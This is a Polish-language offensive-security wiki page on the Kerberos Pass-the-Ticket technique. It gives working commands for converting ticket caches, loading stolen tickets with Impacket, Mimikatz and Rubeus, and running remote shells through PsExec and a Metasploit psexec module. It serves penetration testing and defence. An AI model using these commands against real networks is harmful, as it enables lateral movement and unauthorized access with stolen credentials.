# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

W ataku Pass-the-Ticket (PtT) przeciwnik używa skradzionego biletu Kerberos, aby uwierzytelnić się jako jego podmiot, nie posiadając hasła do tego konta. Bilet przyznający bilety (TGT) może służyć do żądania biletów usługowych, natomiast skradziony bilet usługowy jest ograniczony do usługi docelowej i okresu ważności.<sup>[[1]](#references)</sup>

Techniki pozyskiwania biletów opisano tutaj:

- [Pozyskiwanie biletów z Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Pozyskiwanie biletów z Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Konwersja formatów biletów z Linux i Windows

Pamięci podręczne Kerberos często występują w Linux jako pliki MIT `ccache`, a w Windows jako pliki `.kirbi`. `ticket_converter` konwertuje te formaty, wykorzystując bilet wejściowy i ścieżkę wyjściową.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo udostępnia również narzędzia do obsługi biletów Kerberos w systemie Windows.<sup>[[3]](#references)</sup>

## Using a Ticket

W systemie Linux ustaw `KRB5CCNAME` na ścieżkę do cache i poinstruuj klienta Impacket, aby używał Kerberos bez pytania o hasło:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

W systemie Windows Mimikatz lub Rubeus mogą zaimportować bilet `.kirbi` do bieżącej sesji logowania. Użyj `klist`, aby sprawdzić powstałą pamięć podręczną.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Zaimportowanie ticketu nie przyznaje uprawnień wykraczających poza te, które określa ticket i polityka autoryzacji usługi docelowej. Wygasłe, unieważnione, nieprawidłowo sformowane lub nieprawidłowo ograniczone zakresem tickety mogą nie działać.<sup>[[1]](#references)</sup>

Aby poznać szerszy kontekst ataków na Kerberos i powiązane techniki pozyskiwania ticketów, zobacz przewodnik Tarlogic po atakach na Kerberos.<sup>[[7]](#references)</sup>

### Ponowne użycie zewnętrznego ticketu w Metasploit

Metasploit nie odczytuje automatycznie `KRB5CCNAME` z Impacket na potrzeby swoich modułów Kerberos. Przekaż modułowi **plik ccache** za pomocą specyficznej dla protokołu opcji `::Krb5Ccname`. Ustaw `::Rhostname` na nazwę hosta SPN celu, a domenę na domenę celu; `RHOST` nadal może wskazywać adres IP celu. Dzięki temu można użyć już pozyskanego ticketu bez podawania hasła konta.<sup>[[8]](#references)</sup>

W razie potrzeby najpierw przekonwertuj plik `.kirbi` do formatu ccache.<sup>[[9]](#references)</sup>

Na przykład, mając ticket dla konta, które może tworzyć usługi na celu, uruchom [moduł SMB PsExec](../lateral-movement/psexec-and-winexec.md), używając tego cache:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit najpierw wybiera pasujący service ticket z dostarczonej pamięci podręcznej. Jeśli znajdzie tylko TGT, żąda service ticketu od KDC, więc ta ścieżka również wymaga łączności z DC. Pamięć podręczna zawierająca wyłącznie service tickety nie zapewnia dostępu do niepowiązanych hostów. W przypadku innych obsługiwanych modułów zmień prefiks opcji (na przykład `Winrm::Krb5Ccname` dla [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - przykłady Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - techniki ataków na Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - uwierzytelnianie usług](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - konwersja plików kirbi i ccache](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Implementacja Kerberos w kliencie SMB Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
